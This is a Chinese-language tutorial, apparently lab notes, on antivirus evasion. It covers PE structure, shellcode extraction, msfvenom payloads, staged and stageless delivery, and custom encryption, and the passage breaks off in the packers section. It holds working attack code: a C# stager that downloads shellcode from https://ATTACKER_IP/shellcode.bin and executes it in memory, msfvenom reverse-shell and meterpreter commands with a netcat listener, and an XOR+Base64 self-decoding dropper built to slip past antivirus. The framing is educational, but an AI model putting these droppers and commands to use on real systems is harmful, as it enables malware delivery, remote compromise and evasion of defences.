
#### 目录
- [Shellcode 技术详解](#shellcode-技术详解-shellcode-techniques-explained)
- [分阶段与无阶段 Shellcode 载荷](#分阶段与无阶段-shellcode-载荷-staged-vs-stageless-shellcode-payloads)
- [使用 MSFVenom 进行编码与加密](#使用-msfvenom-进行编码与加密-encoding-and-encryption-with-msfvenom)
- [创建自定义有效载荷以规避检测](#创建自定义有效载荷以规避检测-creating-custom-payloads-for-evasion)
- [加壳器](#加壳器-packers)
- [绑定器](#绑定器-binders)

#### 概述：Windows PE 可移植可执行文件格式 (Overview: Windows PE - Portable Executable Format)

Windows 可执行文件格式，即 **PE (Portable Executable) 格式**，是一种标准化的文件结构，它封装了 Windows 操作系统加载和执行程序所需的全部信息。这种格式不仅定义了可执行代码在磁盘上的组织方式，还指导着 Windows 和 DOS 加载器如何将文件内容解析、映射到内存中并最终运行。

通常，Windows 系统中的二进制文件，如可执行程序 (`.exe`)、动态链接库 (`.dll`) 以及对象代码文件 (`.obj`)，都遵循相同的 PE 结构。该格式兼容 x86 和 x64 CPU 架构。

##### 1. PE 文件结构组成 (PE File Structure Components)

一个 PE 文件主要由以下几个部分构成：

- **PE 头部 (PE Headers)**: 包含关于文件的元数据信息、指向重要数据结构的指针以及到内存中各节区地址的链接。PE 头部自身又由多个子头部组成（如 DOS 头、NT 头、可选头）。
- **节区表 (Section Table)**: 描述了文件中各个节区（Section）的属性，如名称、大小、位置和权限。
- **节区数据 (Section Data)**: 包含实际的数据和代码，这些数据以“容器”的形式存在，Windows 加载器依据节区表的信息来处理它们。常见的节区及其用途包括：
    1. **.text (或 .code)**: 存储程序实际执行的机器代码。
    2. **.data**: 存储已初始化且已定义的全局变量和静态变量。
    3. **.bss**: 存储未初始化的数据（即声明了但未赋予初始值的全局和静态变量）。这部分数据在磁盘文件中通常不占空间，加载时由加载器在内存中分配并清零。
    4. **.rdata**: 包含只读数据，如字符串常量、导入/导出表的部分内容。
    5. **.edata**: 包含导出目录表 (Export Directory Table)，列出了该 PE 文件（通常是 DLL）导出的函数和变量及其地址信息。
    6. **.idata**: 包含导入目录表 (Import Directory Table)，列出了该 PE 文件依赖的其他模块（DLL）及其导入的函数。
    7. **.reloc**: 包含基址重定位信息 (Base Relocation Table)，用于当文件加载到非首选基址时修正代码中的绝对地址引用。
    8. **.rsrc**: 包含程序使用的外部资源，如图像、图标、菜单、对话框模板、字符串表、版本信息（通常在清单文件中定义，包含程序版本、作者、公司、版权等）以及嵌入式二进制数据。

##### 2. Windows 加载器解析 PE 文件的过程 (How Windows Loader Reads a PE File)

当我们查看 PE 文件的原始内容时，会看到大量对人类而言不可直接阅读的字节数据。然而，这些字节数据精确地包含了加载器运行文件所需的所有细节。以下是 Windows 加载器读取可执行二进制文件并将其作为进程运行的简化步骤：

1. **解析头部区域 (Parsing Headers)**:
    - 首先解析 **DOS 头**。其开头的幻数 "MZ" (0x4D5A) 告诉加载器这是一个可执行文件。DOS 头中的 `e_lfanew` 字段指向 **NT 头** (`IMAGE_NT_HEADERS`)。
    - 接着解析 **NT 头**，它包含：
        - 文件签名 "PE\0\0" (0x50450000)。
        - **文件头 (`IMAGE_FILE_HEADER`)**: 提供文件基本信息，如目标 CPU 架构 (x86/x64)、节区数量、创建时间戳等。
        - **可选头 (`IMAGE_OPTIONAL_HEADER`)**: 提供更详细的加载信息，如入口点地址 (AddressOfEntryPoint)、映像基址 (ImageBase)、代码和数据大小、子系统类型等。
2. **解析节区表 (Parsing Section Table)**: 加载器读取 NT 头之后紧跟着的节区表，获取每个节区的名称、大小、虚拟地址 (RVA - Relative Virtual Address)、文件偏移量和特性（如可读/可写/可执行）。
3. **内存映射 (Mapping to Memory)**: 根据节区表信息，加载器将文件的相关部分（主要是各个节区）从磁盘映射到进程的虚拟地址空间中。映像基址 (ImageBase) 是文件在内存中的首选加载地址，RVA 是相对于此基址的地址。
4. **加载依赖项 (Loading Dependencies)**: 加载器解析导入表 (`.idata` 节区)，找到程序依赖的 DLL，并将这些 DLL 加载到进程的地址空间中。然后填充导入地址表 (IAT)，使得程序可以正确调用外部函数。
5. **执行入口点 (Executing Entry Point)**: 所有准备工作完成后，加载器将控制权转移到 PE 文件可选头中指定的入口点地址 (AddressOfEntryPoint)，程序开始执行其主函数。

##### 3. 理解 PE 格式的重要性 (Why Understand PE Format?)

- **加壳与脱壳 (Packing and Unpacking)**: 许多恶意软件使用加壳技术来压缩、加密或混淆其代码，以逃避检测。理解 PE 结构是分析和移除这些保护层（脱壳）的基础。
- **杀毒软件规避与恶意软件分析 (AV Evasion and Malware Analysis)**: AV 软件和恶意软件分析师通过分析 PE 头部和节区信息来识别恶意软件。因此，要创建或修改能够规避 AV 检测的恶意软件，或者要深入分析恶意样本，就必须理解 PE 结构，并知道恶意 Shellcode 可以存储在哪些位置。
- **控制 Shellcode 存储位置**: 通过定义和初始化 Shellcode 变量的方式，可以影响 Shellcode 被编译器放置在 PE 文件的哪个数据节区中：
    1. 在主函数中将 Shellcode 定义为**局部变量**，它通常会被存储在 **`.text` 节区** (代码段，因为栈帧在代码段中分配和执行)。
    2. 将 Shellcode 定义为**全局变量**，它通常会被存储在 **`.data` 节区** (已初始化数据段)。
    3. 将 Shellcode 作为原始二进制数据嵌入到**图标图像**或其他资源中，并在代码中链接它，这种情况下 Shellcode 会出现在 **`.rsrc` 节区** (资源段)。
    4. 可以手动或通过编译器指令添加一个**自定义数据节区**来专门存储 Shellcode。

---

#### Shellcode 技术详解 (Shellcode Techniques Explained)

##### 1. Shellcode 定义 (Definition of Shellcode)

**Shellcode** 是一小段经过精心构造的、位置无关的机器码指令。当它被注入到一个易受攻击的程序（或进程）中并成功执行时，它会修改该程序的正常代码执行流程，更新寄存器和函数调用，以执行攻击者预设的功能。这些功能在大多数情况下旨在获取目标系统的 Shell 访问权限（例如，启动一个命令行解释器）或创建一个反向命令 Shell 连接回攻击者。

Shellcode 通常使用**汇编语言**编写，然后转换为十六进制的操作码 (Opcode) 序列。编写独特和定制化的 Shellcode 可以显著提高其规避 AV 软件检测的能力。

##### 2. 一个简单的 Shellcode 示例 (Linux x64) (A Simple Shellcode Example)

要生成自己的 Shellcode，通常需要从汇编语言编写机器代码，然后提取其对应的字节码。以下示例展示了一个简单的 64 位 Linux Shellcode，它使用两个主要的系统调用：

- `sys_write` (系统调用号 1): 用于向文件描述符（通常是标准输出）打印字符串。
- `sys_exit` (系统调用号 60): 用于终止程序的执行。

**64 位 Linux 系统调用约定 (部分)**:

|   |   |   |   |
|---|---|---|---|
|**rax (系统调用号)**|**rdi (第一个参数)**|**rsi (第二个参数)**|**rdx (第三个参数)**|
|`0x1` (`sys_write`)|`unsigned int fd` (文件描述符)|`const char *buf` (字符串指针)|`size_t count` (长度)|
|`0x3c` (`sys_exit`)|`int error_code` (退出码)|(未使用)|(未使用)|

**汇编代码 (`thm.asm`)**:

代码段

```
global _start

section .text
_start:
    jmp MESSAGE         ; 1) 跳转到 MESSAGE 标签获取字符串地址的技巧

GOBACK:
    mov rax, 0x1        ; sys_write 系统调用号
    mov rdi, 0x1        ; 文件描述符 1 (STDOUT)
    pop rsi             ; 3) 从栈中弹出 MESSAGE 的地址到 rsi (字符串指针)
    mov rdx, 0xd        ; 字符串 "THM, Rocks!\r\n" 的长度 (13字节)
    syscall             ; 执行 sys_write

    mov rax, 0x3c       ; sys_exit 系统调用号
    mov rdi, 0x0        ; 退出码 0 (成功)
    syscall             ; 执行 sys_exit

MESSAGE:
    call GOBACK         ; 2) 调用 GOBACK。call指令会将下一条指令的地址 (即 "THM, Rocks!" 字符串的地址) 压入栈中
    db "THM, Rocks!", 0dh, 0ah ; 要打印的字符串和换行符 (\r\n)
```

代码解释:

程序首先跳转到 MESSAGE 标签下的 call GOBACK 指令。执行 call 指令时，下一条指令（即 db "THM, Rocks!", ... 这行定义的字符串数据）的地址会被压入栈中。然后程序跳转到 GOBACK 标签。在 GOBACK 中，pop rsi 指令会将栈顶的地址（即字符串的地址）弹出到 rsi 寄存器中，供 sys_write 使用。

**编译、链接与执行 (Linux)**:

Bash

```
user@AttackBox$ nasm -f elf64 thm.asm         # 编译汇编代码为对象文件 thm.o
user@AttackBox$ ld thm.o -o thm             # 链接对象文件为可执行文件 thm
user@AttackBox$ ./thm                       # 执行
THM,Rocks!
```

**提取 Shellcode**:

1. 使用 `objdump` 查看 `.text` 节的反汇编，找到机器码：
    
    Bash
    
    ```
    user@AttackBox$ objdump -d thm
    ```
    
    输出片段：
    
    ```
    0000000000400080 <_start>:
      400080:   eb 1e                   jmp    4000a0 <MESSAGE>
    0000000000400082 <GOBACK>:
      400082:   b8 01 00 00 00          mov    $0x1,%eax
      400087:   bf 01 00 00 00          mov    $0x1,%edi
      40008c:   5e                      pop    %rsi
      40008d:   ba 0d 00 00 00          mov    $0xd,%edx
      400092:   0f 05                   syscall
      400094:   b8 3c 00 00 00          mov    $0x3c,%eax
      400099:   bf 00 00 00 00          mov    $0x0,%edi
      40009e:   0f 05                   syscall
    00000000004000a0 <MESSAGE>:
      4000a0:   e8 dd ff ff ff          callq  400082 <GOBACK>
      4000a5:   54                      push   %rsp  ; 这部分是字符串 "THM, Rocks!", 0dh, 0ah
      4000a6:   48                      rex.W
      4000a7:   4d                      rex.R
      4000a8:   2c 20                   sub    $0x20,%al ; ' '
      4000aa:   52                      push   %rdx  ; 'R'
      4000ab:   6f                      outsl  %ds:(%rsi),(%dx) ; 'o'
      4000ac:   63 6b 73                movslq 0x73(%rbx),%ebp ; 'cks'
      4000af:   21                      .byte 0x21 ; '!'
      4000b0:   0d                      .byte 0xd  ; CR
      4000b1:   0a                      .byte 0xa  ; LF
    ```
    
    (注意：`objdump` 输出中的 `push %rsp` 等指令实际上是 `db "THM, Rocks!", ...` 的反汇编结果，显示为指令是因为反汇编器默认尝试将所有字节解释为指令。实际的十六进制值才是 Shellcode 的一部分。)
    
2. 使用 `objcopy` 和 `xxd` 提取并格式化为 C 字符串：
    
    Bash
    
    ```
    user@AttackBox$ objcopy -j .text -O binary thm thm.text # 将 .text 节内容转储为原始二进制文件
    user@AttackBox$ xxd -i thm.text                        # 将二进制文件转换为 C 字符串格式
    ```
    
    输出：
    
    C
    
    ```
    unsigned char thm_text[] = { // 原文为 new_text
      0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,
      0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,
      0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,
      0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21, // "THM, Rocks!"
      0x0d, 0x0a                                                              // \r\n
    };
    unsigned int thm_text_len = 50; // 原文为 new_text_len
    ```
    

**在 C 程序中测试提取的 Shellcode (Linux)**:

C

```
#include <stdio.h>
#include <string.h> // For memcpy, if needed for alignment or other purposes
#include <sys/mman.h> // For mprotect, if memory is not executable

// Shellcode from xxd output
unsigned char message[] = {
    0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,
    0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,
    0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,
    0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,
    0x0d, 0x0a
};

int main(int argc, char **argv) {
    // For security reasons, data segments are usually not executable.
    // We might need to use mprotect to make the memory region executable.
    // Or compile with flags that allow stack/data execution (like -z execstack).

    // Simple execution by casting to a function pointer
    (*(void(*)())message)();
    return 0;
}
```

编译与执行 (Linux)，注意 `-z execstack` 允许在栈/数据段执行代码 (不推荐用于生产环境)：

Bash

```
user@AttackBox$ gcc -g -Wall -z execstack thm.c -o thmx
user@AttackBox$ ./thmx
THM,Rocks!
```

##### 3. 使用公共工具生成 Shellcode (Generating Shellcode with Public Tools)

如 Metasploit 框架的 `msfvenom` 工具，可以方便地生成针对不同平台、架构和功能的 Shellcode。

- **优点**: 无需手动编写汇编，快速生成。
- **缺点**: 由公共工具生成的 Shellcode 签名通常广为人知，极易被 AV 软件检测到。

**Msfvenom 示例 (Windows 执行 calc.exe)**:

Bash

```
user@AttackBox$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
# 输出:
# No encoder specified, outputting raw payload
# Payload size: 193 bytes
# Final size of c file: 835 bytes
unsigned char buf[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
// ... (shellcode bytes) ...
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
```

这个 Shellcode 的功能是在 Windows 系统上执行 `calc.exe` (计算器程序)。计算器常被用作概念验证，如果成功弹出，则证明 Shellcode 执行技术有效。

##### 4. Shellcode 注入与执行 (Windows 示例) (Shellcode Injection and Execution)

Shellcode 注入技术旨在修改目标程序的执行流程，使其执行攻击者提供的代码。以下是在 C 代码中执行先前由 `msfvenom` 生成的 `calc.exe` Shellcode 的示例 (Windows 环境)：

C

```
#include <windows.h> // For VirtualProtect

// Shellcode generated by msfvenom for windows/exec cmd=calc.exe
char stager[] = {
    "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30",
    // ... (rest of the shellcode bytes) ...
    "\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
};

int main() {
    DWORD oldProtect;
    // Make the memory region containing the shellcode executable
    VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);

    // Cast the shellcode address to a function pointer and call it
    int (*shellcode_func)() = (int(*)())(void*)stager;
    shellcode_func();

    return 0;
}
```

**编译 (使用 MinGW 交叉编译器)**:

Bash

```
user@AttackBox$ i686-w64-mingw32-gcc calc.c -o calc-MSF.exe
```

将 `calc-MSF.exe` 传输到 Windows 机器并执行，如果成功，会弹出计算器。

##### 5. 从原始二进制文件 (`.bin`) 生成 Shellcode (Generating Shellcode from Raw Binary Files)

C2 框架或 `msfvenom` 也可以将 Shellcode 输出为原始二进制文件 (通常是 `.bin` 格式)。可以使用 `xxd -i` 命令将其转换为 C 语言数组格式。

**Msfvenom 生成 `.bin` 文件**:

Bash

```
user@AttackBox$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/example.bin
# Output:
# No encoder specified, outputting raw payload
# Payload size: 193 bytes
```

**使用 `xxd` 转换**:

Bash

```
user@AttackBox$ xxd -i /tmp/example.bin
```

输出的 C 数组将与 `-f c` 或 `-f csharp` 格式的 Shellcode 字节内容相同。

---

#### 分阶段与无阶段 Shellcode 载荷 (Staged vs. Stageless Shellcode Payloads)

在将最终 Shellcode 传递给受害者时，主要有两种载荷 (Payload) 类型：分阶段 (Staged) 和无阶段 (Stageless)。

##### 1. 无阶段载荷 (Stageless Payloads)

- **定义**: 无阶段载荷直接将最终的、完整的 Shellcode 嵌入到其自身。可以将其想象为一个“打包”的应用程序，通过单步过程执行完整的 Shellcode。
- **优势**:
    - 生成的可执行文件包含所有必要功能，无需额外下载。
    - 执行时通常不需要额外的网络连接 (除了 Shellcode 自身可能建立的连接，如反向 Shell)。网络交互少，降低被网络入侵检测系统 (NIPS) 检测的风险。
    - 适用于网络连接非常受限或隔离的目标环境 (例如，通过 USB 投递攻击封闭网络)。

##### 2. 分阶段载荷 (Staged Payloads)

- **定义**: 分阶段载荷使用一个或多个中间 Shellcode (称为 **Stager** 或 Stage0) 作为获取并执行最终完整 Shellcode (称为 Stage1, Stage2, ...) 的步骤。
- **工作流程 (典型两阶段)**:
    1. **Stage0 (Stager)**: 一个非常小巧的 Shellcode Stub，其主要功能是连接到攻击者的机器 (C2 服务器)。
    2. 从 C2 服务器下载最终的、功能更完整的 Shellcode (Stage1)。
    3. 将下载的 Stage1 Shellcode 注入到当前进程（或另一进程）的内存中并执行它。
- **优势**:
    - **磁盘占用小**: Stage0 Stager 通常非常小，便于投递和隐藏。
    - **最终载荷不落地**: 最终的 Shellcode (Stage1) 通常直接加载到内存中执行，从不接触磁盘，这使得基于磁盘签名的 AV 更难检测到它。
    - **隐蔽性**: 如果初始的 Stager 被捕获，防御方只能分析 Stager 本身，而无法直接获取到最终的恶意载荷。
    - **灵活性**: 可以使用同一个 Stage0 Dropper 来传输和执行多种不同的最终 Shellcode，只需在 C2 服务器上替换 Stage1 即可。

##### 3. 分阶段 vs. 无阶段：如何选择 (Staged vs. Stageless: Choosing the Right One)

选择哪种类型的载荷取决于具体的攻击场景和目标环境。

- **无阶段载荷更适用**:
    - 目标网络具有严格的出口网络访问控制（例如，防火墙阻止 Stager 下载最终载荷）。
    - 需要一次性投递完整功能，不依赖后续网络交互的场景。
- **分阶段载荷更适用**:
    - 希望最小化初始投递文件在目标机器上的磁盘足迹。
    - 希望通过内存加载执行来提高规避某些 AV 检测的可能性。
    - 希望隐藏最终 Shellcode，不使其在初始投递文件中暴露。

##### 4. Metasploit 中的 Stagers 命名约定 (Stagers in Metasploit Naming)

在使用 `msfvenom` 或 Metasploit 框架时，可以通过载荷名称区分分阶段和无阶段版本：

- **无阶段载荷 (Stageless)**: 名称中通常不包含额外的分隔符。
    - 例如: `windows/x64/shell_reverse_tcp`
    - 例如: `windows/x64/meterpreter_reverse_tcp`
- **分阶段载荷 (Staged)**: 名称中通常在平台和最终Shell类型之间有一个额外的 `/shell/` 或 `/meterpreter/` 等。
    - 例如: `windows/x64/shell/reverse_tcp` (Stager + Reverse TCP Shell Stage1)
    - 例如: `windows/x64/meterpreter/reverse_tcp` (Stager + Meterpreter Stage1)

##### 5. 创建自定义 Stager (C# 示例) (Creating Your Own Stager)

以下是一个 C# Stager 示例，它从指定的 URL 下载 Shellcode (`shellcode.bin`)，然后在内存中执行它。

C#

```
using System;
using System.Net;
using System.Runtime.InteropServices; // For Marshal.Copy & DllImport
// using System.Configuration.Install; // Not used in provided snippet
// using System.Security.Cryptography.X509Certificates; // Not directly used, but related to ServicePointManager

public class Program
{
    // P/Invoke for Windows API functions
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    // Original: UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    // Original: IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    // Memory allocation constants
    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; // RWX permissions

    public static void Main()
    {
        // URL from which to download the final shellcode
        string url = "https://ATTACKER_IP/shellcode.bin"; // Replace ATTACKER_IP
        Stager(url);
    }

    public static void Stager(string url)
    {
        WebClient wc = new WebClient();
        // Bypass SSL certificate validation errors (e.g., for self-signed certs)
        ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
        // Ensure TLS 1.2 is used for the HTTPS connection
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

        byte[] shellcode;
        try
        {
            // Download the shellcode
            shellcode = wc.DownloadData(url);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error downloading shellcode: " + ex.Message);
            return;
        }

        // Allocate executable memory in the current process
        IntPtr codeAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (codeAddr == IntPtr.Zero)
        {
            Console.WriteLine("VirtualAlloc failed. Error: " + Marshal.GetLastWin32Error());
            return;
        }

        // Copy the downloaded shellcode into the allocated memory
        Marshal.Copy(shellcode, 0, codeAddr, shellcode.Length);

        IntPtr threadHandle = IntPtr.Zero;
        uint threadId = 0;
        // IntPtr parameter = IntPtr.Zero; // Parameter to pass to the new thread (not used here)

        // Create a new thread to execute the shellcode
        threadHandle = CreateThread(IntPtr.Zero, 0, codeAddr, IntPtr.Zero, 0, out threadId);
        if (threadHandle == IntPtr.Zero)
        {
            Console.WriteLine("CreateThread failed. Error: " + Marshal.GetLastWin32Error());
            VirtualFree(codeAddr, 0, 0x8000); // MEM_RELEASE
            return;
        }

        // Wait for the shellcode thread to finish execution
        WaitForSingleObject(threadHandle, 0xFFFFFFFF); // INFINITE

        // Clean up (optional, as process is likely exiting or shellcode takes over)
        CloseHandle(threadHandle);
        VirtualFree(codeAddr, 0, 0x8000); // MEM_RELEASE
    }

    // VirtualFree P/Invoke needed for cleanup
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
}
```

**编译 (Windows)**:

PowerShell

```
PS C:\> csc staged-payload.cs
```

**使用 Stager 运行反向 Shell**:

1. **生成最终 Shellcode (`shellcode.bin`)**:
    
    Bash
    
    ```
    user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b '\x00\x0a\x0d' # 移除常见坏字节
    ```
    
2. **创建自签名证书并启动 HTTPS 服务器**:
    
    Bash
    
    ```
    user@AttackBox$ openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
    user@AttackBox$ python3 -m http.server --bind 0.0.0.0 443 --cgi # (Simplified, for HTTPS see original complex command or use a proper server)
    # 原文 Python HTTPS 服务器命令:
    # python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
    ```
    
    (确保 `shellcode.bin` 在服务器的根目录下)
3. **设置 Netcat 监听器**:
    
    Bash
    
    ```
    user@AttackBox$ nc -lvnp 7474
    ```
    
4. 在目标 Windows 机器上执行编译好的 `staged-payload.exe`。它应连接到 HTTPS 服务器，下载 `shellcode.bin`，并在内存中执行，最终在攻击机上获得反向 Shell。

---

#### 使用 MSFVenom 进行编码与加密 (Encoding and Encryption with MSFVenom)

Msfvenom 等工具提供编码和加密功能，旨在改变 Shellcode 的字节模式以尝试规避 AV 检测。然而，由于这些是公开工具的标准化功能，AV 厂商通常能够识别和检测这些经过简单编码或加密的载荷。

##### 1. MSFVenom 编码 (Encoding)

- **列出可用编码器**:
    
    Bash
    
    ```
    user@AttackBox$ msfvenom --list encoders | grep excellent
    # 输出示例:
    #    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    #    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    ```
    
- **使用 `shikata_ga_nai` 编码器进行多次迭代**:
    
    Bash
    
    ```
    user@AttackBox$ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
    ```
    
    尽管经过多次编码，这种载荷在现代 AV面前通常仍然会被检测到。

##### 2. MSFVenom 加密 (Encryption)

- **列出可用加密算法**:
    
    Bash
    
    ```
    user@AttackBox$ msfvenom --list encrypt
    # 输出示例:
    #    Name
    #    ----
    #    aes256
    #    base64
    #    rc4
    #    xor
    ```
    
- **使用 XOR 加密**:
    
    Bash
    
    ```
    user@AttackBox$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe
    ```
    
    同样，这种由 `msfvenom` 直接生成的简单 XOR 加密载荷也极易被 AV 检测。

---

#### 创建自定义有效载荷以规避检测 (Creating Custom Payloads for Evasion)

克服标准工具检测的最佳方法是实现**自定义的编码或加密方案**，使 AV 难以通过已知签名或简单分析来识别载荷。有时，即使是简单技术的组合也可能有效。

##### 1. 示例：自定义 XOR + Base64 编码/解码

我们将结合 XOR 加密和 Base64 编码来处理由 `msfvenom` 生成的原始 C# 格式 Shellcode。

- 步骤 A: 编码器程序 (C# - Encrypter.cs)
    
    此程序接收原始 Shellcode，使用自定义密钥进行 XOR 加密，然后对结果进行 Base64 编码。
    
    C#
    
    ```
    using System;
    using System.Text; // For Encoding.ASCII
    
    namespace Encrypter
    {
        internal class Program
        {
            private static byte[] XorEncryptDecrypt(byte[] data, byte[] keyBytes)
            {
                byte[] result = new byte[data.Length];
                for (int i = 0; i < data.Length; i++)
                {
                    result[i] = (byte)(data[i] ^ keyBytes[i % keyBytes.Length]);
                }
                return result;
            }
    
            static void Main(string[] args)
            {
                string key = "THMK3y123!"; // 自定义 XOR 密钥
                byte[] keyBytes = Encoding.ASCII.GetBytes(key);
    
                // 原始 Shellcode (由 msfvenom -f csharp 生成，替换此处)
                byte[] buf = new byte[460] {
                    0xfc,0x48,0x83, /* ... (完整的 Shellcode 字节) ... */ ,0xda,0xff,0xd5
                };
    
                byte[] encoded = XorEncryptDecrypt(buf, keyBytes); // XOR 加密
                Console.WriteLine(Convert.ToBase64String(encoded)); // Base64 编码并输出
            }
        }
    }
    ```
    
    编译并运行编码器：
    
    PowerShell
    
    ```
    C:\> csc.exe Encrypter.cs
    C:\> .\Encrypter.exe
    # 输出 Base64 编码后的字符串，例如: qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=
    ```
    
- 步骤 B: 自解码有效载荷 (C# - Dropper)
    
    此程序嵌入了编码后的载荷，在运行时首先进行 Base64 解码，然后使用相同的密钥进行 XOR 解密，最后在内存中执行 Shellcode。
    
    C#
    
    ```
    using System;
    using System.Text;
    using System.Runtime.InteropServices;
    
    public class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
    
        private static byte[] XorEncryptDecrypt(byte[] data, byte[] keyBytes)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ keyBytes[i % keyBytes.Length]);
            }
            return result;
        }
    
        public static void Main()
        {
            // 将编码器输出的 Base64 字符串粘贴到此处
            string dataBS64 = "qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=";
            byte[] data = Convert.FromBase64String(dataBS64); // Base64 解码
    
            string key = "THMK3y123!"; // 必须与编码器中使用的密钥相同
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);
    
            byte[] decodedShellcode = XorEncryptDecrypt(data, keyBytes); // XOR 解密
    
            IntPtr codeAddr = VirtualAlloc(IntPtr.Zero, (uint)decodedShellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(decodedShellcode, 0, codeAddr, decodedShellcode.Length);
    
            IntPtr threadHandle = IntPtr.Zero;
            uint threadId = 0;
            threadHandle = CreateThread(IntPtr.Zero, 0, codeAddr, IntPtr.Zero, 0, out threadId);
            WaitForSingleObject(threadHandle, 0xFFFFFFFF);
            // Cleanup...
        }
    }
    ```
    
    这种自定义组合方式比 `msfvenom` 直接输出的编码/加密载荷具有更高的 AV 规避成功率，因为其特征对于 AV 来说是未知的。
    

---

#### 加壳器 (Packers)

加壳器是另一种用于改变可执行文件磁盘特征以试图规避 AV 检测的方法。

##### 1. 定义与目的

**加壳器 (Packer)** 是一种软件工具，它接收一个可执行程序作为输入，并将其原始结构进行转换（例如压缩、加密、混淆），生成一个新的可执行文件，但新文件在运行时仍能实现与原始程序完全相同的功能。

主要目的：

1. **压缩程序**: 减小程序在磁盘上占用的空间。
2. **保护程序免受逆向工程**: 通过增加分析难度来防止代码被轻易反编译或破解。

加壳器被合法软件开发者用于保护其知识产权，但也被恶意软件作者广泛用于混淆恶意代码，逃避基于签名的 AV 检测。常见的加壳器有 UPX, MPRESS, Themida 等。

##### 2. 加壳应用程序的工作原理

1. **转换**: 打包函数（加壳器核心逻辑）对原始应用程序的代码和数据进行转换（压缩、加密等）。
2. **嵌入解包器**: 加壳器会将一个**解包存根 (Unpacker Stub)**（一小段负责解开原始代码的代码）嵌入到新的打包后的可执行文件中。
3. **重定向入口点**: 新可执行文件的程序入口点 (Entry Point) 被修改为指向这个解包器存根。

当打包后的应用程序执行时：

1. 解包器存根首先被执行。
2. 解包器读取或解密被打包的应用程序代码。
3. 解包器将原始的、未打包的代码写入内存中的某个位置。
4. 解包器将程序的执行流程重定向到内存中解包后的原始代码的入口点。

##### 3. 加壳器与杀毒软件

